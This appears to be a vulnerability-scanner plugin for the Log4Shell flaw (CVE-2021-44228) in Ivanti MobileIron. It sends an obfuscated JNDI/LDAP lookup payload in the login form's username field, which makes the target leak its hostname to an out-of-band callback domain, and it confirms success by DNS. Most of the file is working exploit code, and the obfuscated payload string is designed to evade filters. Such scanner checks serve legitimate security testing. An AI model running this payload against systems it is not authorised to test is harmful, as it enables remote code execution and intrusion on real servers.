import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Ivanti MobileIron Log4J JNDI RCE''',
        "description": '''Ivanti MobileIron Apache Log4j2 <=2.14.1 JNDI in features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.''',
        "severity": "high",
        "references": [
            "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q", 
            "https://www.lunasec.io/docs/blog/log4j-zero-day/", 
            "https://www.zdnet.com/article/mobileiron-customers-urged-to-patch-systems-due-to-potential-log4j-exploitation/", 
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "CVE-2021-44228",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["jndi", "log4j", "rce", "cve", "cve2021"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/mifs/j_spring_security_check"""
        method = "POST"
        data = """j_username=${j${k8s:k5:-ND}i${sd:k5:-:}${lower:l}d${lower:a}${lower:p}://${hostName}.%s}&j_password=password&logincontext=employee""" % oob_domain
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url